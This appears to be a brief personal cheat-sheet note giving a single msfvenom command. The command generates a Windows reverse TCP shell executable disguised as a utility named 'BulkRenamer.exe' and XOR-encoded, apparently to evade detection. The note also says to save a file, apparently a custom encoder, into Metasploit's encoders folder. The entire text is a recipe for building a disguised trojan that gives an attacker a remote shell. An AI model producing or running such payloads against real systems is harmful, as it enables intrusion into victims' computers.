sudo msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe -o BulkRenamer.exe -e x86/bf_xor

Save into below
/usr/share/metasploit-framework/modules/encoders/x86/
